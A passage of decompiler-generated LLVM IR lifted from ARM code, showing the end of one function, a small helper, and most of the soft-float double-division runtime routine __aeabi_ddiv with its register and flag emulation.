  %v4_1c4c8 = or i1 %v0_1c4c8, %v3_1c4c8
  br i1 %v4_1c4c8, label %dec_label_pc_1c4cc, label %dec_label_pc_1c630

dec_label_pc_1c4cc:                               ; preds = %dec_label_pc_1c4c8
  %v0_1c4cc = load i32, i32* @r4, align 4
  %v4_1c4cc = add i32 %v0_1c4cc, 54
  %v6_1c4cc = sub i32 0, %v0_1c4cc
  %v7_1c4cc = and i32 %v4_1c4cc, %v6_1c4cc
  %v8_1c4cc = icmp slt i32 %v7_1c4cc, 0
  store i1 %v8_1c4cc, i1* @cpsr_v, align 1
  %v9_1c4cc = icmp slt i32 %v4_1c4cc, 0
  store i1 %v9_1c4cc, i1* @cpsr_n, align 1
  %v10_1c4cc = icmp eq i32 %v4_1c4cc, 0
  store i1 %v10_1c4cc, i1* @cpsr_z, align 1
  %v7_1c4d0 = icmp sgt i32 %v0_1c4cc, -54
  br i1 %v7_1c4d0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_1c4cc
  store i32 0, i32* @r1, align 4
  %v8_1c4d4 = load i32, i32* %r0.global-to-local, align 4
  %v9_1c4d4 = and i32 %v8_1c4d4, -2147483648
  store i32 %v9_1c4d4, i32* %r0.global-to-local, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v9_1c4d4

bb6:                                              ; preds = %dec_label_pc_1c4cc
  %v1_1c4dc = sub i32 0, %v0_1c4cc
  %v2_1c4e0 = sub i32 -32, %v0_1c4cc
  %v4_1c4e0 = add i32 %v0_1c4cc, 31
  %v5_1c4e0 = and i32 %v4_1c4e0, %v1_1c4dc
  %v6_1c4e0 = icmp slt i32 %v5_1c4e0, 0
  store i1 %v6_1c4e0, i1* @cpsr_v, align 1
  %v6_1c4e4 = icmp slt i32 %v1_1c4dc, 32
  br i1 %v6_1c4e4, label %dec_label_pc_1c4e8, label %dec_label_pc_1c54c

dec_label_pc_1c4e8:                               ; preds = %bb6
  %v1_1c4e8 = add i32 %v2_1c4e0, 12
  %v8_1c4ec = icmp sgt i32 %v1_1c4e8, 0
  br i1 %v8_1c4ec, label %dec_label_pc_1c520, label %dec_label_pc_1c4f0

dec_label_pc_1c4f0:                               ; preds = %dec_label_pc_1c4e8
  %v1_1c4f0 = add i32 %v2_1c4e0, 32
  %v1_1c4f4 = sub i32 0, %v2_1c4e0
  %v0_1c4f8 = load i32, i32* @r1, align 4
  %v6_1c4f8 = shl i32 %v0_1c4f8, %v1_1c4f4
  %v2_1c4fc = add i32 %v2_1c4e0, 31
  %v3_1c4fc = shl i32 1, %v2_1c4fc
  %v6_1c4fc = lshr i32 %v0_1c4f8, %v1_1c4f0
  %v1_1c500 = load i32, i32* %r0.global-to-local, align 4
  %v7_1c500 = shl i32 %v1_1c500, %v1_1c4f4
  %v8_1c500 = or i32 %v7_1c500, %v6_1c4fc
  %v1_1c504 = and i32 %v1_1c500, -2147483648
  %tmp = bitcast i32 %v1_1c500 to float
  %tmp13 = call float @fabsf(float %tmp)
  %v1_1c508 = bitcast float %tmp13 to i32
  %tmp14 = icmp slt i32 %v6_1c4f8, 0
  %v4_1c50c = zext i1 %tmp14 to i32
  %v5_1c50c = add i32 %v8_1c500, %v4_1c50c
  store i32 %v5_1c50c, i32* @r1, align 4
  %v5_1c510 = and i32 %v1_1c508, %v3_1c4fc
  %v6_1c510 = icmp ne i32 %v5_1c510, 0
  %v7_1c510 = lshr i32 %v1_1c508, %v1_1c4f0
  %v9_1c510 = add i32 %v7_1c510, %v1_1c504
  %v10_1c510 = zext i1 %v6_1c510 to i32
  %v11_1c510 = add i32 %v9_1c510, %v10_1c510
  store i32 %v11_1c510, i32* %r0.global-to-local, align 4
  %v19_1c510 = add i32 %v11_1c510, %v10_1c510
  %v20_1c510 = xor i32 %v19_1c510, %v1_1c500
  %v21_1c510 = xor i32 %v19_1c510, %v7_1c510
  %v22_1c510 = and i32 %v20_1c510, %v21_1c510
  %v23_1c510 = icmp slt i32 %v22_1c510, 0
  store i1 %v23_1c510, i1* @cpsr_v, align 1
  %v0_1c514 = load i32, i32* @lr, align 4
  %v3_1c514 = mul i32 %v6_1c4f8, 2
  %v4_1c514 = or i32 %v0_1c514, %v3_1c514
  %v5_1c514 = icmp slt i32 %v4_1c514, 0
  store i1 %v5_1c514, i1* @cpsr_n, align 1
  %v6_1c514 = icmp eq i32 %v4_1c514, 0
  store i1 %v6_1c514, i1* @cpsr_z, align 1
  br i1 %v6_1c514, label %bb7, label %bb8

bb7:                                              ; preds = %dec_label_pc_1c4f0
  %tmp15 = sext i1 %tmp14 to i32
  %v6_1c518 = add nsw i32 %tmp15, -1
  %v7_1c518 = and i32 %v5_1c50c, %v6_1c518
  store i32 %v7_1c518, i32* @r1, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_1c4f0, %bb7
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v11_1c510

dec_label_pc_1c520:                               ; preds = %dec_label_pc_1c4e8
  %v1_1c520 = sub i32 0, %v2_1c4e0
  %v1_1c524 = add i32 %v2_1c4e0, 32
  %v0_1c528 = load i32, i32* @r1, align 4
  %v6_1c528 = shl i32 %v0_1c528, %v1_1c520
  %v6_1c52c = lshr i32 %v0_1c528, %v1_1c524
  %v1_1c530 = load i32, i32* %r0.global-to-local, align 4
  %v7_1c530 = shl i32 %v1_1c530, %v1_1c520
  %v8_1c530 = or i32 %v7_1c530, %v6_1c52c
  %v1_1c534 = and i32 %v1_1c530, -2147483648
  %tmp16 = icmp slt i32 %v6_1c528, 0
  %v4_1c538 = zext i1 %tmp16 to i32
  %v5_1c538 = add i32 %v8_1c530, %v4_1c538
  store i32 %v5_1c538, i32* @r1, align 4
  %v6_1c538 = icmp ult i32 %v5_1c538, %v8_1c530
  %v2_1c53c = zext i1 %v6_1c538 to i32
  %v3_1c53c = or i32 %v2_1c53c, %v1_1c534
  store i32 %v3_1c53c, i32* %r0.global-to-local, align 4
  %v9_1c53c = add nsw i32 %v3_1c53c, %v2_1c53c
  %v10_1c53c = sub i32 0, %v1_1c530
  %v11_1c53c = and i32 %v9_1c53c, %v10_1c53c
  %v12_1c53c = icmp slt i32 %v11_1c53c, 0
  store i1 %v12_1c53c, i1* @cpsr_v, align 1
  %v0_1c540 = load i32, i32* @lr, align 4
  %v3_1c540 = mul i32 %v6_1c528, 2
  %v4_1c540 = or i32 %v0_1c540, %v3_1c540
  %v5_1c540 = icmp slt i32 %v4_1c540, 0
  store i1 %v5_1c540, i1* @cpsr_n, align 1
  %v6_1c540 = icmp eq i32 %v4_1c540, 0
  store i1 %v6_1c540, i1* @cpsr_z, align 1
  br i1 %v6_1c540, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_1c520
  %tmp17 = sext i1 %tmp16 to i32
  %v6_1c544 = add nsw i32 %tmp17, -1
  %v7_1c544 = and i32 %v5_1c538, %v6_1c544
  store i32 %v7_1c544, i32* @r1, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_1c520, %bb9
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v3_1c53c

dec_label_pc_1c54c:                               ; preds = %bb6
  %v1_1c54c = sub i32 32, %v2_1c4e0
  %v0_1c550 = load i32, i32* @lr, align 4
  %v1_1c550 = load i32, i32* @r1, align 4
  %v7_1c550 = shl i32 %v1_1c550, %v1_1c54c
  %v8_1c550 = or i32 %v7_1c550, %v0_1c550
  %v6_1c554 = lshr i32 %v1_1c550, %v2_1c4e0
  %v1_1c558 = load i32, i32* %r0.global-to-local, align 4
  %v7_1c558 = shl i32 %v1_1c558, %v1_1c54c
  %v8_1c558 = or i32 %v7_1c558, %v6_1c554
  %v6_1c55c = lshr i32 %v1_1c558, %v2_1c4e0
  %v1_1c560 = and i32 %v1_1c558, -2147483648
  store i32 %v1_1c560, i32* %r0.global-to-local, align 4
  %v7_1c564 = lshr i32 %v1_1c560, %v2_1c4e0
  %v8_1c564 = sub i32 -1, %v7_1c564
  %v9_1c564 = and i32 %v6_1c55c, %v8_1c564
  %tmp18 = icmp slt i32 %v8_1c558, 0
  %v4_1c568 = zext i1 %tmp18 to i32
  %v5_1c568 = add i32 %v4_1c568, %v9_1c564
  store i32 %v5_1c568, i32* @r1, align 4
  %v3_1c56c = mul i32 %v8_1c558, 2
  %v4_1c56c = or i32 %v8_1c550, %v3_1c56c
  %v5_1c56c = icmp slt i32 %v4_1c56c, 0
  store i1 %v5_1c56c, i1* @cpsr_n, align 1
  %v6_1c56c = icmp eq i32 %v4_1c56c, 0
  store i1 %v6_1c56c, i1* @cpsr_z, align 1
  br i1 %v6_1c56c, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_1c54c
  %tmp19 = sext i1 %tmp18 to i32
  %v6_1c570 = add nsw i32 %tmp19, -1
  %v7_1c570 = and i32 %v5_1c568, %v6_1c570
  store i32 %v7_1c570, i32* @r1, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_1c54c, %bb11
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_1c560

dec_label_pc_1c630:                               ; preds = %dec_label_pc_1c4c8
  %v0_1c630 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c630 = and i32 %v0_1c630, -2147483648
  %v1_1c638 = or i32 %v1_1c630, 2146435072
  store i32 %v1_1c638, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_1c638

; uselistorder directives
  uselistorder i32 %v3_1c53c, { 2, 0, 1 }
  uselistorder i32 %v8_1c530, { 1, 0 }
  uselistorder i32 %v1_1c520, { 1, 0 }
  uselistorder i32 %v11_1c510, { 1, 0, 2 }
  uselistorder i32 %v1_1c500, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1c4f4, { 1, 0 }
  uselistorder i32 %v2_1c4e0, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1c4dc, { 1, 0 }
  uselistorder i32 %v4_1c4cc, { 1, 2, 0 }
  uselistorder i32 %v0_1c4cc, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32 %tmp4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp2, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 7, 1, 8, 2, 9, 3, 10, 4, 5 }
  uselistorder i32 12, { 39, 40, 9, 10, 41, 42, 43, 0, 44, 5, 45, 16, 46, 47, 11, 3, 48, 12, 7, 73, 74, 75, 76, 77, 78, 8, 79, 80, 81, 82, 83, 84, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 13, 17, 33, 37, 18, 19, 67, 68, 69, 1, 70, 6, 71, 2, 72, 14, 63, 64, 65, 66, 85, 4, 62, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 35, 15, 36, 38 }
  uselistorder i32 -32, { 2, 1, 3, 4, 5, 6, 10, 7, 11, 12, 8, 0, 9 }
  uselistorder i32 54, { 3, 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_1c644(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1c644:
  %v1_1c648 = or i32 %arg1, 2146959360
  ret i32 %v1_1c648
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1c650 = load i32, i32* @r4, align 4
  store i32 %v3_1c650, i32* %stack_var_-16, align 4
  %v6_1c650 = load i32, i32* @r5, align 4
  %v9_1c650 = load i32, i32* @r6, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1c65c = load i32, i32* %r0.global-to-local, align 4
  %v4_1c65c = udiv i32 %v1_1c65c, 1048576
  %v5_1c65c = urem i32 %v4_1c65c, 2048
  store i32 %v5_1c65c, i32* @r4, align 4
  %v6_1c65c = icmp eq i32 %v5_1c65c, 0
  br i1 %v6_1c65c, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre150 = udiv i32 %arg3, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1c660 = udiv i32 %arg3, 1048576
  %v6_1c660 = urem i32 %v5_1c660, 2048
  store i32 %v6_1c660, i32* %r5.global-to-local, align 4
  %v7_1c660 = icmp eq i32 %v6_1c660, 0
  br i1 %v7_1c660, label %.thread1, label %bb92

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1c7e4

bb92:                                             ; preds = %bb
  %v5_1c664 = icmp eq i32 %v5_1c65c, 2047
  br i1 %v5_1c664, label %.thread2, label %bb93

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb92
  %.pre148.pre-phi = phi i32 [ %.pre150, %entry..thread2_crit_edge ], [ %v5_1c660, %bb92 ]
  br label %dec_label_pc_1c7e4

bb93:                                             ; preds = %bb92
  %v5_1c668 = icmp eq i32 %v6_1c660, 2047
  br i1 %v5_1c668, label %dec_label_pc_1c7e4, label %dec_label_pc_1c670

dec_label_pc_1c670:                               ; preds = %bb93
  %v2_1c670 = sub nsw i32 %v5_1c65c, %v6_1c660
  store i32 %v2_1c670, i32* %r4.global-to-local, align 4
  %v2_1c674 = xor i32 %v1_1c65c, %arg3
  %v4_1c678 = mul i32 %arg3, 4096
  %v5_1c678 = or i32 %v4_1c678, %arg4
  store i32 %v5_1c678, i32* %r5.global-to-local, align 4
  %v7_1c678 = icmp eq i32 %v5_1c678, 0
  %v3_1c67c = mul i32 %v1_1c65c, 4096
  store i32 %v3_1c67c, i32* %r0.global-to-local, align 4
  br i1 %v7_1c678, label %dec_label_pc_1c7b4, label %dec_label_pc_1c684

dec_label_pc_1c684:                               ; preds = %dec_label_pc_1c670
  %tmp94 = mul i32 %arg3, 256
  %v4_1c68c = and i32 %tmp94, 268435200
  %v4_1c690 = udiv i32 %arg4, 16777216
  %v5_1c68c = or i32 %v4_1c690, %v4_1c68c
  %v5_1c690 = or i32 %v5_1c68c, 268435456
  store i32 %v5_1c690, i32* %r2.global-to-local, align 4
  %v3_1c694 = mul i32 %arg4, 256
  store i32 %v3_1c694, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_1c65c, 256
  %v4_1c698 = and i32 %tmp95, 268435200
  %v1_1c69c = load i32, i32* @r1, align 4
  %v4_1c69c = udiv i32 %v1_1c69c, 16777216
  %v5_1c698 = or i32 %v4_1c698, %v4_1c69c
  %v5_1c69c = or i32 %v5_1c698, 268435456
  store i32 %v5_1c69c, i32* %r5.global-to-local, align 4
  %v3_1c6a0 = mul i32 %v1_1c69c, 256
  store i32 %v3_1c6a0, i32* %r6.global-to-local, align 4
  %v1_1c6a4 = and i32 %v2_1c674, -2147483648
  store i32 %v1_1c6a4, i32* %r0.global-to-local, align 4
  %v3_1c6a8 = icmp uge i32 %v5_1c69c, %v5_1c690
  %v9_1c6a8 = icmp eq i32 %v5_1c69c, %v5_1c690
  br i1 %v9_1c6a8, label %bb96, label %bb97

bb96:                                             ; preds = %dec_label_pc_1c684
  %v4_1c6ac = icmp uge i32 %v3_1c6a0, %v3_1c694
  br label %bb97

bb97:                                             ; preds = %dec_label_pc_1c684, %bb96
  %v1_1c6b0 = phi i1 [ %v3_1c6a8, %dec_label_pc_1c684 ], [ %v4_1c6ac, %bb96 ]
  %v2_1c6b0 = add nsw i32 %v2_1c670, 253
  %v3_1c6b0 = zext i1 %v1_1c6b0 to i32
  %v4_1c6b0 = add nsw i32 %v2_1c6b0, %v3_1c6b0
  %v8_1c6b0 = icmp ule i32 %v4_1c6b0, %v2_1c670
  %v9_1c6b0 = icmp ugt i32 %v2_1c670, -254
  %v10_1c6b0 = select i1 %v1_1c6b0, i1 %v8_1c6b0, i1 %v9_1c6b0
  %v1_1c6b4 = add nsw i32 %v4_1c6b0, 768
  store i32 %v1_1c6b4, i32* %r4.global-to-local, align 4
  br i1 %v10_1c6b0, label %dec_label_pc_1c6c4, label %dec_label_pc_1c6bc

dec_label_pc_1c6bc:                               ; preds = %bb97
  %v3_1c6bc = udiv i32 %v5_1c690, 2
  store i32 %v3_1c6bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c6c4

dec_label_pc_1c6c4:                               ; preds = %bb97, %dec_label_pc_1c6bc
  %v0_1c6cc = phi i32 [ %v5_1c690, %bb97 ], [ %v3_1c6bc, %dec_label_pc_1c6bc ]
  %v0_1c6d0 = phi i32 [ %v3_1c694, %bb97 ], [ 0, %dec_label_pc_1c6bc ]
  %v2_1c6c4 = sub i32 %v3_1c6a0, %v0_1c6d0
  store i32 %v2_1c6c4, i32* %r6.global-to-local, align 4
  %v3_1c6c4 = icmp uge i32 %v3_1c6a0, %v0_1c6d0
  %v3_1c6c8 = icmp eq i1 %v3_1c6c4, false
  %v4_1c6c8 = sub nsw i32 %v5_1c69c, %v0_1c6cc
  %v6_1c6c8 = sext i1 %v3_1c6c8 to i32
  %v7_1c6c8 = add nsw i32 %v6_1c6c8, %v4_1c6c8
  store i32 %v7_1c6c8, i32* %r5.global-to-local, align 4
  %v3_1c6cc = udiv i32 %v0_1c6cc, 2
  store i32 %v3_1c6cc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c6dc.outer

dec_label_pc_1c6dc.outer:                         ; preds = %dec_label_pc_1c774, %dec_label_pc_1c6c4
  %v1_1c788.ph = phi i32 [ %v2_1c774, %dec_label_pc_1c774 ], [ %v1_1c6a4, %dec_label_pc_1c6c4 ]
  %v0_1c6e0.ph = phi i32 [ %v5_1c750, %dec_label_pc_1c774 ], [ %v7_1c6c8, %dec_label_pc_1c6c4 ]
  %v1_1c6e4.ph = phi i32 [ %v3_1c754, %dec_label_pc_1c774 ], [ %v2_1c6c4, %dec_label_pc_1c6c4 ]
  %v5_1c75c17.ph = phi i32 [ %v5_1c75c, %dec_label_pc_1c774 ], [ %v3_1c6cc, %dec_label_pc_1c6c4 ]
  %v3_1c76013.ph = phi i32 [ %v3_1c760, %dec_label_pc_1c774 ], [ 0, %dec_label_pc_1c6c4 ]
  %storemerge136 = phi i32 [ 0, %dec_label_pc_1c774 ], [ 1048576, %dec_label_pc_1c6c4 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1c774 ], [ 524288, %dec_label_pc_1c6c4 ]
  store i32 %storemerge136, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1c6dc

dec_label_pc_1c6dc:                               ; preds = %dec_label_pc_1c6dc.outer, %dec_label_pc_1c74c
  %v1_1c74059 = phi i32 [ %v2_1c788, %dec_label_pc_1c74c ], [ %storemerge136, %dec_label_pc_1c6dc.outer ]
  %v1_1c6ec = phi i32 [ %v1_1c6ec32, %dec_label_pc_1c74c ], [ %storemerge136, %dec_label_pc_1c6dc.outer ]
  %v1_1c70841 = phi i32 [ %v1_1c70843, %dec_label_pc_1c74c ], [ %storemerge136, %dec_label_pc_1c6dc.outer ]
  %v1_1c72450 = phi i32 [ %v1_1c72452, %dec_label_pc_1c74c ], [ %storemerge136, %dec_label_pc_1c6dc.outer ]
  %v0_1c764 = phi i32 [ %v3_1c764, %dec_label_pc_1c74c ], [ %storemerge, %dec_label_pc_1c6dc.outer ]
  %v0_1c6e0 = phi i32 [ %v5_1c750, %dec_label_pc_1c74c ], [ %v0_1c6e0.ph, %dec_label_pc_1c6dc.outer ]
  %v1_1c6e4 = phi i32 [ %v3_1c754, %dec_label_pc_1c74c ], [ %v1_1c6e4.ph, %dec_label_pc_1c6dc.outer ]
  %v5_1c75c17 = phi i32 [ %v5_1c75c, %dec_label_pc_1c74c ], [ %v5_1c75c17.ph, %dec_label_pc_1c6dc.outer ]
  %v3_1c76013 = phi i32 [ %v3_1c760, %dec_label_pc_1c74c ], [ %v3_1c76013.ph, %dec_label_pc_1c6dc.outer ]
  %v3_1c6dc = icmp uge i32 %v1_1c6e4, %v3_1c76013
  %v3_1c6e0 = icmp eq i1 %v3_1c6dc, false
  %v4_1c6e0 = sub i32 %v0_1c6e0, %v5_1c75c17
  %v6_1c6e0 = sext i1 %v3_1c6e0 to i32
  %v7_1c6e0 = add i32 %v6_1c6e0, %v4_1c6e0
  %v8_1c6e0 = zext i1 %v3_1c6e0 to i32
  %v9_1c6e0 = sub i32 %v7_1c6e0, %v8_1c6e0
  %v10_1c6e0 = icmp ult i32 %v0_1c6e0, %v9_1c6e0
  %v11_1c6e0 = icmp ne i32 %v5_1c75c17, -1
  %v12_1c6e0 = or i1 %v11_1c6e0, %v10_1c6e0
  %v13_1c6e0 = icmp ult i32 %v0_1c6e0, %v5_1c75c17
  %v14_1c6e0 = select i1 %v3_1c6e0, i1 %v12_1c6e0, i1 %v13_1c6e0
  br i1 %v14_1c6e0, label %.thread4, label %bb98

bb98:                                             ; preds = %dec_label_pc_1c6dc
  %v3_1c6e4 = sub i32 %v1_1c6e4, %v3_1c76013
  store i32 %v3_1c6e4, i32* %r6.global-to-local, align 4
  store i32 %v7_1c6e0, i32* %r5.global-to-local, align 4
  %v3_1c6ec = or i32 %v1_1c6ec, %v0_1c764
  store i32 %v3_1c6ec, i32* %r1.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1c6dc, %bb98
  %v1_1c74058 = phi i32 [ %v1_1c74059, %dec_label_pc_1c6dc ], [ %v3_1c6ec, %bb98 ]
  %v1_1c6ec35 = phi i32 [ %v1_1c6ec, %dec_label_pc_1c6dc ], [ %v3_1c6ec, %bb98 ]
  %v1_1c708 = phi i32 [ %v1_1c70841, %dec_label_pc_1c6dc ], [ %v3_1c6ec, %bb98 ]
  %v1_1c72449 = phi i32 [ %v1_1c72450, %dec_label_pc_1c6dc ], [ %v3_1c6ec, %bb98 ]
  %v0_1c6fc = phi i32 [ %v0_1c6e0, %dec_label_pc_1c6dc ], [ %v7_1c6e0, %bb98 ]
  %v1_1c700 = phi i32 [ %v1_1c6e4, %dec_label_pc_1c6dc ], [ %v3_1c6e4, %bb98 ]
  %v1_1c6f0 = urem i32 %v5_1c75c17, 2
  %v2_1c6f0 = icmp ne i32 %v1_1c6f0, 0
  %v3_1c6f0 = udiv i32 %v5_1c75c17, 2
  %v3_1c6f4 = zext i1 %v2_1c6f0 to i32
  %v6_1c6f4 = zext i32 %v3_1c76013 to i64
  %v7_1c6f4 = sub i32 33, %v3_1c76013
  %v8_1c6f4 = zext i32 %v7_1c6f4 to i64
  %v9_1c6f4 = shl i64 %v6_1c6f4, %v8_1c6f4
  %v10_1c6f4 = sub i32 32, %v3_1c76013
  %v11_1c6f4 = shl i32 %v3_1c6f4, %v10_1c6f4
  %v12_1c6f4 = zext i32 %v11_1c6f4 to i64
  %v14_1c6f4 = or i64 %v12_1c6f4, %v9_1c6f4
  %v15_1c6f4 = trunc i64 %v14_1c6f4 to i32
  %v3_1c6f8 = icmp uge i32 %v1_1c700, %v15_1c6f4
  %v3_1c6fc = icmp eq i1 %v3_1c6f8, false
  %v4_1c6fc = sub i32 %v0_1c6fc, %v3_1c6f0
  %v6_1c6fc = sext i1 %v3_1c6fc to i32
  %v7_1c6fc = add i32 %v6_1c6fc, %v4_1c6fc
  %v13_1c6fc = icmp ult i32 %v0_1c6fc, %v3_1c6f0
  %v14_1c6fc = or i1 %v13_1c6fc, %v3_1c6fc
  br i1 %v14_1c6fc, label %.thread6, label %bb99

bb99:                                             ; preds = %.thread4
  %v3_1c700 = sub i32 %v1_1c700, %v15_1c6f4
  store i32 %v3_1c700, i32* %r6.global-to-local, align 4
  store i32 %v7_1c6fc, i32* %r5.global-to-local, align 4
  %v5_1c708 = udiv i32 %v0_1c764, 2
  %v6_1c708 = or i32 %v1_1c708, %v5_1c708
  store i32 %v6_1c708, i32* %r1.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb99
  %v1_1c74057 = phi i32 [ %v1_1c74058, %.thread4 ], [ %v6_1c708, %bb99 ]
  %v1_1c6ec34 = phi i32 [ %v1_1c6ec35, %.thread4 ], [ %v6_1c708, %bb99 ]
  %v1_1c70845 = phi i32 [ %v1_1c708, %.thread4 ], [ %v6_1c708, %bb99 ]
  %v1_1c724 = phi i32 [ %v1_1c72449, %.thread4 ], [ %v6_1c708, %bb99 ]
  %v0_1c718 = phi i32 [ %v0_1c6fc, %.thread4 ], [ %v7_1c6fc, %bb99 ]
  %v1_1c71c = phi i32 [ %v1_1c700, %.thread4 ], [ %v3_1c700, %bb99 ]
  %v1_1c70c = urem i32 %v3_1c6f0, 2
  %v2_1c70c = icmp ne i32 %v1_1c70c, 0
  %v3_1c70c = udiv i32 %v5_1c75c17, 4
  %v3_1c710 = zext i1 %v2_1c70c to i32
  %v6_1c710 = and i64 %v14_1c6f4, 4294967295
  %v7_1c710 = sub i32 33, %v15_1c6f4
  %v8_1c710 = zext i32 %v7_1c710 to i64
  %v9_1c710 = shl i64 %v6_1c710, %v8_1c710
  %v10_1c710 = sub i32 32, %v15_1c6f4
  %v11_1c710 = shl i32 %v3_1c710, %v10_1c710
  %v12_1c710 = zext i32 %v11_1c710 to i64
  %v14_1c710 = or i64 %v12_1c710, %v9_1c710
  %v15_1c710 = trunc i64 %v14_1c710 to i32
  %v3_1c714 = icmp uge i32 %v1_1c71c, %v15_1c710
  %v3_1c718 = icmp eq i1 %v3_1c714, false
  %v4_1c718 = sub i32 %v0_1c718, %v3_1c70c
  %v6_1c718 = sext i1 %v3_1c718 to i32
  %v7_1c718 = add i32 %v6_1c718, %v4_1c718
  %v13_1c718 = icmp ult i32 %v0_1c718, %v3_1c70c
  %v14_1c718 = or i1 %v13_1c718, %v3_1c718
  br i1 %v14_1c718, label %.thread8, label %bb100

bb100:                                            ; preds = %.thread6
  %v3_1c71c = sub i32 %v1_1c71c, %v15_1c710
  store i32 %v3_1c71c, i32* %r6.global-to-local, align 4
  store i32 %v7_1c718, i32* %r5.global-to-local, align 4
  %v5_1c724 = udiv i32 %v0_1c764, 4
  %v6_1c724 = or i32 %v1_1c724, %v5_1c724
  store i32 %v6_1c724, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb100
  %v1_1c740 = phi i32 [ %v1_1c74057, %.thread6 ], [ %v6_1c724, %bb100 ]
  %v1_1c6ec33 = phi i32 [ %v1_1c6ec34, %.thread6 ], [ %v6_1c724, %bb100 ]
  %v1_1c70844 = phi i32 [ %v1_1c70845, %.thread6 ], [ %v6_1c724, %bb100 ]
  %v1_1c72453 = phi i32 [ %v1_1c724, %.thread6 ], [ %v6_1c724, %bb100 ]
  %v0_1c734 = phi i32 [ %v0_1c718, %.thread6 ], [ %v7_1c718, %bb100 ]
  %v1_1c738 = phi i32 [ %v1_1c71c, %.thread6 ], [ %v3_1c71c, %bb100 ]
  %v1_1c728 = urem i32 %v3_1c70c, 2
  %v2_1c728 = icmp ne i32 %v1_1c728, 0
  %v3_1c728 = udiv i32 %v5_1c75c17, 8
  %v3_1c72c = zext i1 %v2_1c728 to i32
  %v6_1c72c = and i64 %v14_1c710, 4294967295
  %v7_1c72c = sub i32 33, %v15_1c710
  %v8_1c72c = zext i32 %v7_1c72c to i64
  %v9_1c72c = shl i64 %v6_1c72c, %v8_1c72c
  %v10_1c72c = sub i32 32, %v15_1c710
  %v11_1c72c = shl i32 %v3_1c72c, %v10_1c72c
  %v12_1c72c = zext i32 %v11_1c72c to i64
  %v14_1c72c = or i64 %v12_1c72c, %v9_1c72c
  %v15_1c72c = trunc i64 %v14_1c72c to i32
  %v3_1c730 = icmp uge i32 %v1_1c738, %v15_1c72c
  %v3_1c734 = icmp eq i1 %v3_1c730, false
  %v4_1c734 = sub i32 %v0_1c734, %v3_1c728
  %v6_1c734 = sext i1 %v3_1c734 to i32
  %v7_1c734 = add i32 %v6_1c734, %v4_1c734
  %v13_1c734 = icmp ult i32 %v0_1c734, %v3_1c728
  %v14_1c734 = or i1 %v13_1c734, %v3_1c734
  br i1 %v14_1c734, label %.thread10, label %bb102

bb102:                                            ; preds = %.thread8
  %v3_1c738 = sub i32 %v1_1c738, %v15_1c72c
  store i32 %v3_1c738, i32* %r6.global-to-local, align 4
  store i32 %v7_1c734, i32* %r5.global-to-local, align 4
  %v5_1c740 = udiv i32 %v0_1c764, 8
  %v6_1c740 = or i32 %v1_1c740, %v5_1c740
  store i32 %v6_1c740, i32* %r1.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb102
